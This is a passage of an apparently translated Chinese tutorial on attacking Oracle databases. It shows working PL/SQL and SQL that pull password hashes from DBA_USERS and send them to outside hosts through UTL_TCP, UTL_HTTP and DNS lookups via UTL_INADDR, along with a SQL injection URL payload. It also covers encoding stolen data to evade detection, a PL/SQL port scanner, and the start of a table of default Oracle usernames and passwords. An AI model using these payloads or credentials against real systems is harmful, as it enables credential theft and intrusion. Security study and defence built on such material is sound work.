<h3 id="数据泄漏"><a href="#数据泄漏" class="headerlink" title="数据泄漏"></a>数据泄漏</h3><p>数据泄露是在不被注意的情况下获取数据的过程。 这可能就像使用物理备份磁带一样简单，也可能像使用网络上的隐蔽通道一样复杂。 Joanna Rutkowska 开发了一种更复杂的隐蔽通道方法。 它被称为NUSHU，以中国妇女使用的一种古老的密语命名。 NUSHU，最近的一个，使用 TCP 初始序列号来隐藏加密数据。 虽然可以检测到 NUSHU（使用英国剑桥大学的 Steven J. Murdoch 和 Stephen Lewis 以及俄罗斯塔甘罗格州立大学的 Eugene Tumoian 和 Maxim Anikeev 开发的方法），但必须指出的是，这些方法是在 NUSHU 被开发之后才发表。</p>
<h4 id="使用-UTL-TCP"><a href="#使用-UTL-TCP" class="headerlink" title="使用 UTL_TCP"></a>使用 UTL_TCP</h4><p>UTL_TCP PL/SQL 包使 Oracle 服务器能够创建到指定 TCP 端口上的远程主机的出站连接。 因此，它是一种从数据库中提取数据的有用方法。 首先连接到给定主机上的给定 TCP 端口，然后一旦连接就可以传输数据。 不用说，如果 Oracle 服务器受到带有出口过滤功能的防火墙的保护，那么攻击者就需要确定哪些端口被允许出去。 这可以使用前面介绍的 TCP 端口扫描器来实现。 通常，远程管理端口（例如 22 (SSH) 和 3389（终端服务））以及网络基础设施端口（例如 TCP 53 (DNS)）通常是“开放的”。 发现可访问端口 25 (SMTP)、80 (HTTP) 和 443 (HTTPS) 的情况也并不少见。 以下代码演示了如何将 UTL_TCP 用作从数据库服务器提取数据的带外方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">TYPE C_TYPE IS REF CURSOR;</span><br><span class="line">CV C_TYPE;</span><br><span class="line">PASSWORD VARCHAR2(30);</span><br><span class="line">USERNAME VARCHAR2(30);</span><br><span class="line">C UTL_TCP.CONNECTION;</span><br><span class="line">L PLS_INTEGER;</span><br><span class="line">BEGIN</span><br><span class="line">C:= UTL_TCP.OPEN_CONNECTION(&#x27;192.168.0.10&#x27;,111,&#x27;US7ASCII&#x27;);</span><br><span class="line">OPEN CV FOR &#x27;SELECT USERNAME,PASSWORD FROM SYS.DBA_USERS&#x27;;</span><br><span class="line">LOOP</span><br><span class="line">      FETCH CV INTO USERNAME,PASSWORD;</span><br><span class="line">      L:=UTL_TCP.WRITE_LINE(C, USERNAME||&#x27;:&#x27;||PASSWORD);</span><br><span class="line">EXIT WHEN CV%NOTFOUND;</span><br><span class="line">END LOOP;</span><br><span class="line">CLOSE CV;</span><br><span class="line">UTL_TCP.CLOSE_CONNECTION(C);</span><br><span class="line">END;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<p>此代码连接到 192.168.0.10 上的 TCP 端口 111 (PortMapper)。 然后它从 DBA_USERS 中选择用户名和密码，将它们连接起来，然后通过网络发送它们。 然后连接关闭。 暂时忽略 DBMS_EXPORT_EXTENSION（参见第 5 章，“Oracle 和 PL/SQL”），像这样执行大块匿名 PL/SQL 大多只有在直接连接到数据库服务器时才可用； 它对 SQL 注入情况没有用。 然而，UTL_HTTP 可以。 我们接下来看看这个。</p>
<h4 id="使用-UTL-HTTP"><a href="#使用-UTL-HTTP" class="headerlink" title="使用 UTL_HTTP"></a>使用 UTL_HTTP</h4><p>UTL_HTTP 包可用于从 Oracle 数据库服务器向 Web 服务器发出带外请求。 请求函数接受一个 URL：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_http.request(&#x27;http://192.168.0.100:5500/&#x27;||(SELECT PASSWORD FROM DBA_USERS WHERE USERNAME=&#x27;SYS&#x27;)) from dual;</span><br></pre></td></tr></table></figure>

<p>您可以在此处看到感兴趣的数据是 SYS 用户的密码。 选中后，它会发送到侦听 TCP 端口 5500 的远程 Web 服务器。 UTL_HTTP.REQUEST 在 SQL 注入场景中特别有用。 例如，假设一个应用程序正在连接 Oracle 后端，并且它容易受到搜索页面 FOO 参数中 SQL 注入的影响。 然后可以注入 UTL_HTTP.REQUEST 来窃取数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/search?FOO=BAR&#x27;||utl_http.request(&#x27;http://192.168.0.100:5500/&#x27;||(SELECT PASSWORD FROM DBA_USERS WHERE USERNAME=&#x27;SYS&#x27;))||&#x27;BAR</span><br></pre></td></tr></table></figure>

<p>其他可以非常有效地用于网络数据泄露的包是 UTL_MAIL、UTL_SMTP 和 UTL_INADDR。 特别令人感兴趣的是 UTL_INADDR，它可用于窃取伪装为 DNS 查询的数据。</p>
<h4 id="使用-DNS-查询和-UTL-INADDR"><a href="#使用-DNS-查询和-UTL-INADDR" class="headerlink" title="使用 DNS 查询和 UTL_INADDR"></a>使用 DNS 查询和 UTL_INADDR</h4><p>UTL_INADDR 包用于查找主机名和 IP 地址，并可用作另一种带外方法。如果服务器已配置了名称服务器（它们几乎总是如此！），则可以使用此包窃取数据。由于域名系统的工作方式，当名称服务器查询到它不知道的主机的 IP 地址时，它会将请求向上转发到负责相关域的名称服务器。例如，如果在连接到我的 ISP 时，我向我的 ISP 的名称服务器查询主机 xyzpqr.ngssoftware.com，那么如果它不在缓存中，它就会将请求转发到 NGS DNS服务器进行解析。 NGS DNS服务器将回复主机的 IP 地址——当然，如果它存在的话。如果您拥有<strong>DNS服务器</strong>，因此可以访问日志或能够捕获离线流量，那么您可以通过 UDP 端口 53 从数据库服务器发送数据 - 当然，假设防火墙设置允许数据库服务器名称查找。</p>
<p>执行查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE USERNAME=&#x27;SYS&#x27;)||&#x27;.ngssoftware.com&#x27;) FROM DUAL;</span><br></pre></td></tr></table></figure>

<p>导致服务器查询 0D47B550C5F70DED.ngssoftware.com：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 78</span><br><span class="line">      Identifier: 18150</span><br><span class="line">      Flags: 0x0000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 17 (UDP)</span><br><span class="line">      Checksum: 0x6a17</span><br><span class="line">      Source IP: 192.168.0.120</span><br><span class="line">      Dest IP: 194.72.6.57</span><br><span class="line">UDP Header</span><br><span class="line">      Source port: 1309</span><br><span class="line">      Dest port: 53</span><br><span class="line">      Length: 58</span><br><span class="line">      Checksum: 0x2cce</span><br><span class="line">DNS Packet</span><br><span class="line">      Identification: 49</span><br><span class="line">      Flags: 0x0100</span><br><span class="line">            DNS Query</span><br><span class="line">            Standard Query</span><br><span class="line">            DNS Message was NOT truncated</span><br><span class="line">            RD (Recursion Desired)</span><br><span class="line">            Server does not support recursive queries</span><br><span class="line">      No. of Questions: 1</span><br><span class="line">      No. of Answer Resource Records: 0</span><br><span class="line">      No. of Name Server Resource Records: 0</span><br><span class="line">      No. Additional Resource Records: 0</span><br><span class="line">      Query Name : 0D47B550C5F70DED.ngssoftware.com</span><br><span class="line">            Query Type : A (Host Address)</span><br><span class="line">            Query Class : IN (Internet Class)</span><br></pre></td></tr></table></figure>

<p>该查询最终到达 NGS DNS服务器，因此可以被捕获。 使用 UTL_INADDR 时，主机名最长可达 254 个字节。 其中，许多字节将用于域 - 例如，ngssoftware.com。 此外，主机名的每个部分都限制为 64 个字符，其中最后一个必须是一个点。</p>
<p>同样，因为 UTL_INADDR 是一个函数，所以它在 SQL 注入场景中很有用。</p>
<h3 id="在泄露之前加密数据"><a href="#在泄露之前加密数据" class="headerlink" title="在泄露之前加密数据"></a>在泄露之前加密数据</h3><p>一些数据库入侵检测产品检查离开服务器的数据以确定它是否与给定的模式匹配 - 例如，个人身份信息 (PII)，如信用卡号或社会保险号。 为了避免触发警报，攻击者可能会在窃取数据之前混淆甚至加密数据。 任何嗅探网络线路的人只会看到看起来无辜的废话或随机字符串。 毋庸置疑，对某些人来说，这可能被视为妥协的证据，因此攻击者需要保持平衡。 以信用卡为例，寻找离开数据库服务器的此类数据的设备通常会被两个或多个卡号的简单串联所欺骗。 数字的每个字符都可以与一个常量相加 - 例如，0x20 - 使用字符 P 到 Y 使数字字符串成为字母字符串。也可以使用 DBMS_OBUSCATION_TOOLKIT、DBMS_CRYPTO 或 UTL_ENCODE 等包。 例如，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_encode.base64_encode((select password from dba_users where username = &#x27;SYS&#x27;)) from dual;</span><br></pre></td></tr></table></figure>

<p>结果是“30367274702B3268744B6F3D”的base64编码字符串。</p>
<p>另一种替代方法是使用 UTL_COMPRESS 的 LZ_COMPRESS 函数，该函数使用 Lempel-Ziv 压缩算法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_compress.lz_compress((select password from dba_users where username = &#x27;SYS&#x27;),6) from dual;</span><br></pre></td></tr></table></figure>

<p>生成字符串“1F8B080000000000000BBBBCEAEDF2B70BB7 AC020094E6B32C08000000”。</p>
<p>这些混淆方法可用于带内和带外方法。</p>
<h3 id="攻击网络上的其他系统"><a href="#攻击网络上的其他系统" class="headerlink" title="攻击网络上的其他系统"></a>攻击网络上的其他系统</h3><p>您刚刚看到 UTL_TCP 可用于在任意 TCP 端口上创建与网络上其他主机的连接。 可以编写脚本将 Oracle 数据库服务器变成 TCP 端口扫描器（可能是有史以来最昂贵的！）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE PACKAGE TCP_SCAN IS</span><br><span class="line">PROCEDURE SCAN(HOST VARCHAR2, START_PORT NUMBER, END_PORT NUMBER,</span><br><span class="line">VERBOSE NUMBER DEFAULT 0);</span><br><span class="line">PROCEDURE CHECK_PORT(HOST VARCHAR2, TCP_PORT NUMBER, VERBOSE NUMBER</span><br><span class="line">DEFAULT 0);</span><br><span class="line">END TCP_SCAN;</span><br><span class="line">/</span><br><span class="line">SHOW ERRORS</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PACKAGE BODY TCP_SCAN IS</span><br><span class="line">PROCEDURE SCAN(HOST VARCHAR2, START_PORT NUMBER, END_PORT NUMBER,</span><br><span class="line">VERBOSE NUMBER DEFAULT 0) AS</span><br><span class="line">I NUMBER := START_PORT;</span><br><span class="line">BEGIN</span><br><span class="line">      FOR I IN START_PORT..END_PORT LOOP</span><br><span class="line">            CHECK_PORT(HOST,I,VERBOSE);</span><br><span class="line">      END LOOP;</span><br><span class="line"></span><br><span class="line">EXCEPTION WHEN OTHERS THEN</span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(&#x27;An error occurred.&#x27;);</span><br><span class="line">END SCAN;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PROCEDURE CHECK_PORT(HOST VARCHAR2, TCP_PORT NUMBER, VERBOSE NUMBER</span><br><span class="line">DEFAULT 0) AS</span><br><span class="line">CN SYS.UTL_TCP.CONNECTION;</span><br><span class="line">NETWORK_ERROR EXCEPTION;</span><br><span class="line">PRAGMA EXCEPTION_INIT(NETWORK_ERROR,-29260);</span><br><span class="line">BEGIN</span><br><span class="line">      DBMS_OUTPUT.ENABLE(1000000);</span><br><span class="line">      CN := UTL_TCP.OPEN_CONNECTION(HOST, TCP_PORT);</span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(&#x27;TCP Port &#x27; || TCP_PORT || &#x27; on &#x27; || HOST ||</span><br><span class="line">&#x27; is open.&#x27;);</span><br><span class="line">      UTL_TCP.CLOSE_CONNECTION(CN);</span><br><span class="line">EXCEPTION WHEN NETWORK_ERROR THEN</span><br><span class="line">      IF VERBOSE !=0 THEN</span><br><span class="line">            DBMS_OUTPUT.PUT_LINE(&#x27;TCP Port &#x27; || TCP_PORT || &#x27; on &#x27; ||</span><br><span class="line">HOST || &#x27; is not open.&#x27;);</span><br><span class="line">      END IF;</span><br><span class="line">      WHEN OTHERS THEN</span><br><span class="line">            DBMS_OUTPUT.PUT_LINE(&#x27;There was an error.&#x27;);</span><br><span class="line">END CHECK_PORT;</span><br><span class="line"></span><br><span class="line">END TCP_SCAN;</span><br><span class="line">/</span><br><span class="line">SHOW ERRORS</span><br><span class="line">/</span><br><span class="line">EXEC TCP_SCAN.SCAN(&#x27;192.168.0.10&#x27;,1,200,1);</span><br></pre></td></tr></table></figure>

<p>UTL_TCP 还可以用作 shellcode 的传递机制，利用其他网络服务器中的缓冲区溢出漏洞——例如，Windows 系统上的 IRemoteActivation 溢出或 Solaris in.lpd 溢出。</p>
<h3 id="Java和网络"><a href="#Java和网络" class="headerlink" title="Java和网络"></a>Java和网络</h3><p>当然，您可以使用 Java 使用套接字或其他预先打包的网络类（如 URL）来连接网络，但要这样做，用户需要连接并解析 java.net.SocketPermission：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec dbms_java.grant_permission(&#x27;SCOTT&#x27;, &#x27;SYS:java.net.SocketPermission&#x27;,&#x27;*&#x27;, &#x27;connect, resolve&#x27;);</span><br></pre></td></tr></table></figure>

<p>一旦你有了它，你就可以连接到任何主机——这在前面的语句中用星号表示。 以下代码使用 URL 类使您能够连接到 Web 服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVAURL&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.net.*;</span><br><span class="line"></span><br><span class="line">public class JAVAURL</span><br><span class="line">&#123;</span><br><span class="line">      public static void getUrl (String purl) throws IOException</span><br><span class="line">       &#123;</span><br><span class="line">              try</span><br><span class="line">              &#123;</span><br><span class="line">                  URL url = new URL(purl);</span><br><span class="line">                  InputStream is = url.openStream();</span><br><span class="line">                  BufferedInputStream bis = new BufferedInputStream(is);</span><br><span class="line">                  int page;</span><br><span class="line"></span><br><span class="line">                  while(true)</span><br><span class="line">                  &#123;</span><br><span class="line">                        page = bis.read();</span><br><span class="line">                        if(page == -1)</span><br><span class="line">                              break;</span><br><span class="line">                        System.out.print((char)page);</span><br><span class="line">                  &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (MalformedURLException mue)</span><br><span class="line">            &#123;</span><br><span class="line">                  System.err.println (&quot;Invalid URL&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (IOException io)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                  System.err.println (&quot;Read Error -&quot; + io);</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVAURLPROC (purl IN VARCHAR2)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVAURL.getUrl (java.lang.String)&#x27;;</span><br><span class="line">/</span><br><span class="line">set serveroutput on</span><br><span class="line">exec dbms_java.set_output(2000);</span><br><span class="line">exec javaurlproc(&#x27;http://www.databasesecurity.com/&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="数据库链接"><a href="#数据库链接" class="headerlink" title="数据库链接"></a>数据库链接</h3><p>当涉及到网络上的其他 Oracle 数据库服务器时，可以使用数据库链接。 数据库链接是一种特殊的数据库对象，它将一个 Oracle 服务器连接到另一个。 它是使用 CREATE DATABASE LINK 语句创建的。 链接可以共享，即公共或私有。 以下将创建一个私人链接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create database link remote_db connect to scott identified by tiger</span><br><span class="line">using &#x27;(DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)</span><br><span class="line">(HOST=192.168.0.120)(PORT=1521))(CONNECT_DATA=</span><br><span class="line"></span><br><span class="line">(SERVICE_NAME=orcl.ngssoftware.com)))&#x27;;</span><br></pre></td></tr></table></figure>

<p>已创建数据库链接。 创建后，可以使用 @ 符号查询链接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt;SELECT USERNAME FROM ALL_USERS@REMOTE_DB</span><br></pre></td></tr></table></figure>

<p>如果用户名和密码正确，第一个服务器将连接到第二个服务器并查询 ALL_USERS 表。</p>
<h2 id="附录A-默认用户名和密码"><a href="#附录A-默认用户名和密码" class="headerlink" title="附录A-默认用户名和密码"></a>附录A-默认用户名和密码</h2><p>Oracle 以安装大量带有默认密码的默认用户帐户而闻名。 尽管 Oracle 10g 的情况有所改善，但仍有许多数据库服务器使用默认帐户。 下表列出了默认用户名和密码。</p>
<table>
<thead>
<tr>
<th><strong>USERNAME</strong></th>
<th><strong>PASSWORD</strong></th>
</tr>
</thead>
<tbody><tr>
<td>AASH</td>
<td>AASH</td>
</tr>
<tr>
<td>ABA1</td>
<td>ABA1</td>
</tr>
<tr>
<td>ABM</td>
<td>ABM</td>
</tr>
<tr>
<td>ADAMS</td>
<td>WOOD</td>
</tr>
<tr>
<td>ADS</td>
<td>ADS</td>
</tr>
<tr>
<td>ADSEUL_US</td>
<td>WELCOME</td>
</tr>
<tr>
<td>AHL</td>
<td>AHL</td>
</tr>
<tr>
<td>AHM</td>
<td>AHM</td>
</tr>
<tr>
<td>AK</td>
<td>AK</td>
</tr>
<tr>
<td>AL</td>
<td>AL</td>
</tr>
<tr>
<td>ALA1</td>
<td>ALA1</td>
</tr>
<tr>
<td>ALLUSERS</td>
<td>ALLUSERS</td>
</tr>
<tr>
<td>ALR</td>
<td>ALR</td>
</tr>
<tr>
<td>AMA1</td>
<td>AMA1</td>
</tr>
<tr>
<td>AMA2</td>
<td>AMA2</td>
</tr>
<tr>
<td>AMA3</td>
<td>AMA3</td>
</tr>
<tr>
<td>AMA4</td>
<td>AMA4</td>
</tr>
<tr>
<td>AMF</td>
<td>AMF</td>
</tr>
<tr>
<td>AMS</td>
<td>AMS</td>
</tr>
<tr>
<td>AMS1</td>
<td>AMS1</td>
</tr>
<tr>
<td>AMS2</td>
<td>AMS2</td>
</tr>
<tr>
<td>AMS3</td>
<td>AMS3</td>
</tr>
<tr>
<td>AMS4</td>
<td>AMS4</td>
</tr>
<tr>
<td>AMSYS</td>
<td>AMSYS</td>
</tr>
<tr>
<td>AMV</td>
<td>AMV</td>
</tr>
<tr>
<td>AMW</td>
<td>AMW</td>
</tr>
<tr>
<td>ANNE</td>
<td>ANNE</td>
</tr>
<tr>
<td>AOLDEMO</td>
<td>AOLDEMO</td>
</tr>
<tr>
<td>AP</td>
<td>AP</td>
</tr>
<tr>
<td>APA1</td>
<td>APA1</td>
</tr>
<tr>
<td>APA2</td>
<td>APA2</td>
</tr>
<tr>
<td>APA3</td>
<td>APA3</td>
</tr>
<tr>
<td>APA4</td>
<td>APA4</td>
</tr>
<tr>
<td>APPLEAD</td>
<td>APPLEAD</td>
</tr>
<tr>
<td>APPLSYS</td>
<td>FND</td>
</tr>
<tr>
<td>APPLSYS</td>
<td>APPS</td>
</tr>
<tr>
<td>APPLSYSPUB</td>
<td>PUB</td>
</tr>
<tr>
<td>APPS</td>
<td>APPS</td>
</tr>
<tr>
<td>APS1</td>
<td>APS1</td>
</tr>
<tr>
<td>APS2</td>
<td>APS2</td>
</tr>
<tr>
<td>APS3</td>
<td>APS3</td>
</tr>
<tr>
<td>APS4</td>
<td>APS4</td>
</tr>
<tr>
<td>AQDEMO</td>
<td>AQDEMO</td>
</tr>
<tr>
<td>AQJAVA</td>
<td>AQJAVA</td>
</tr>
<tr>
<td>AQUSER</td>
<td>AQUSER</td>
</tr>
<tr>
<td>AR</td>
<td>AR</td>
</tr>
<tr>
<td>ARA1</td>
<td>ARA1</td>
</tr>
<tr>
<td>ARA2</td>
<td>ARA2</td>
</tr>
<tr>
<td>ARA3</td>
<td>ARA3</td>
</tr>
<tr>
<td>ARA4</td>
<td>ARA4</td>
</tr>
<tr>
<td>ARS1</td>
<td>ARS1</td>
</tr>
<tr>
<td>ARS2</td>
<td>ARS2</td>
</tr>
<tr>
<td>ARS3</td>
<td>ARS3</td>
</tr>
<tr>
<td>ARS4</td>
<td>ARS4</td>
</tr>
<tr>
<td>ART</td>
<td>ART</td>
</tr>
<tr>
<td>ASF</td>
<td>ASF</td>
</tr>
<tr>
<td>ASG</td>
<td>ASG</td>
</tr>
<tr>
<td>ASL</td>
<td>ASL</td>
</tr>
<tr>
<td>ASN</td>
<td>ASN</td>
</tr>
<tr>
<td>ASO</td>
<td>ASO</td>
</tr>
<tr>
<td>ASP</td>
<td>ASP</td>
</tr>
<tr>
<td>AST</td>
<td>AST</td>
</tr>
<tr>
<td>AUC_GUEST</td>
<td>AUC_GUEST</td>
</tr>
<tr>
<td>AURORA$ORB$UNAUTHENTICATED</td>
<td>INVALID</td>
</tr>
<tr>
<td>AUTHORIA</td>
<td>AUTHORIA</td>
</tr>
<tr>
<td>AX</td>
<td>AX</td>
</tr>
<tr>
<td>AZ</td>
<td>AZ</td>
</tr>
<tr>
<td>B2B</td>
<td>B2B</td>
</tr>
<tr>
<td>BAM</td>
<td>BAM</td>
</tr>
<tr>
<td>BCA1</td>
<td>BCA1</td>
</tr>
<tr>
<td>BCA2</td>
<td>BCA2</td>
</tr>
<tr>
<td>BEN</td>
<td>BEN</td>
</tr>
<tr>
<td>BIC</td>
<td>BIC</td>
</tr>
<tr>
<td>BIL</td>
<td>BIL</td>
</tr>
<tr>
<td>BIM</td>
<td>BIM</td>
</tr>
<tr>
<td>BIS</td>
<td>BIS</td>
</tr>
<tr>
<td>BIV</td>
<td>BIV</td>
</tr>
<tr>
<td>BIX</td>
<td>BIX</td>
</tr>
<tr>
<td>BLAKE</td>
<td>PAPER</td>
</tr>
<tr>
<td>BMEADOWS</td>
<td>BMEADOWS</td>
</tr>
<tr>
<td>BNE</td>
<td>BNE</td>
</tr>
<tr>
<td>BOM</td>
<td>BOM</td>
</tr>
<tr>
<td>BP01</td>
<td>BP01</td>
</tr>
<tr>
<td>BP02</td>
<td>BP02</td>
</tr>
<tr>
<td>BP03</td>
<td>BP03</td>
</tr>
<tr>
<td>BP04</td>
<td>BP04</td>
</tr>
<tr>
<td>BP05</td>
<td>BP05</td>
</tr>
<tr>
<td>BP06</td>
<td>BP06</td>
</tr>
<tr>
<td>BSC</td>
<td>BSC</td>
</tr>
<tr>
<td>BUYACCT</td>
<td>BUYACCT</td>
</tr>
<tr>
<td>BUYAPPR1</td>
<td>BUYAPPR1</td>
</tr>
<tr>
<td>BUYAPPR2</td>
<td>BUYAPPR2</td>
</tr>
<tr>
<td>BUYAPPR3</td>
<td>BUYAPPR3</td>
</tr>
<tr>
<td>BUYER</td>
<td>BUYER</td>
</tr>
<tr>
<td>BUYMTCH</td>
<td>BUYMTCH</td>
</tr>
<tr>
<td>CAMRON</td>
<td>CAMRON</td>
</tr>
<tr>
<td>CANDICE</td>
<td>CANDICE</td>
</tr>
<tr>
<td>CARL</td>
<td>CARL</td>
</tr>
<tr>
<td>CARLY</td>
<td>CARLY</td>
</tr>
<tr>
<td>CARMEN</td>
<td>CARMEN</td>
</tr>
<tr>
<td>CARRIECONYERS</td>
<td>CARRIECONYERS</td>
</tr>
<tr>
<td>CATADMIN</td>
<td>CATADMIN</td>
</tr>
<tr>
<td>CE</td>
<td>CE</td>
</tr>
<tr>
<td>CEASAR</td>
<td>CEASAR</td>
</tr>
<tr>
<td>CENTRA</td>
<td>CENTRA</td>
</tr>
<tr>
<td>CFD</td>
<td>CFD</td>
</tr>
<tr>
<td>CHANDRA</td>
<td>CHANDRA</td>
</tr>
<tr>
<td>CHARLEY</td>
<td>CHARLEY</td>
</tr>
<tr>
<td>CHRISBAKER</td>
<td>CHRISBAKER</td>
</tr>
<tr>
<td>CHRISTIE</td>
<td>CHRISTIE</td>
</tr>
<tr>
<td>CINDY</td>
<td>CINDY</td>
</tr>
<tr>
<td>CLARK</td>
<td>CLARK</td>
</tr>
<tr>
<td>CLARK</td>
<td>CLOTH</td>
</tr>
<tr>
<td>CLAUDE</td>
<td>CLAUDE</td>
</tr>
<tr>
<td>CLINT</td>
<td>CLINT</td>
</tr>
<tr>
<td>CLN</td>
<td>CLN</td>
</tr>
<tr>
<td>CN</td>
<td>CN</td>
</tr>
<tr>
<td>CNCADMIN</td>
<td>CNCADMIN</td>
</tr>
<tr>
<td>CONNIE</td>
<td>CONNIE</td>
</tr>
<tr>
<td>CONNOR</td>
<td>CONNOR</td>
</tr>
<tr>
<td>CORY</td>
<td>CORY</td>
</tr>
<tr>
<td>CRM1</td>
<td>CRM1</td>
</tr>
<tr>
<td>CRM2</td>
<td>CRM2</td>
</tr>
<tr>
<td>CRP</td>
<td>CRP</td>
</tr>
<tr>
<td>CRPB733</td>
<td>CRPB733</td>
</tr>
<tr>
<td>CRPCTL</td>
<td>CRPCTL</td>
</tr>
<tr>
<td>CRPDTA</td>
<td>CRPDTA</td>
</tr>
<tr>
<td>CS</td>
<td>CS</td>
</tr>
<tr>
<td>CSADMIN</td>
<td>CSADMIN</td>
</tr>
<tr>
<td>CSAPPR1</td>
<td>CSAPPR1</td>
</tr>
<tr>
<td>CSC</td>
<td>CSC</td>
</tr>
<tr>
<td>CSD</td>
<td>CSD</td>
</tr>
<tr>
<td>CSDUMMY</td>
<td>CSDUMMY</td>
</tr>
<tr>
<td>CSE</td>
<td>CSE</td>
</tr>
<tr>
<td>CSF</td>
<td>CSF</td>
</tr>
<tr>
<td>CSI</td>
<td>CSI</td>
</tr>
<tr>
<td>CSL</td>
<td>CSL</td>
</tr>
<tr>
<td>CSM</td>
<td>CSM</td>
</tr>
<tr>
<td>CSMIG</td>
<td>CSMIG</td>
</tr>
<tr>
<td>CSP</td>
<td>CSP</td>
</tr>
<tr>
<td>CSR</td>
<td>CSR</td>
</tr>
<tr>
<td>CSS</td>
<td>CSS</td>
</tr>
<tr>
<td>CTXDEMO</td>
<td>CTXDEMO</td>
</tr>
<tr>
<td>CTXSYS</td>
<td>CTXSYS</td>
</tr>
<tr>
<td>CTXSYS</td>
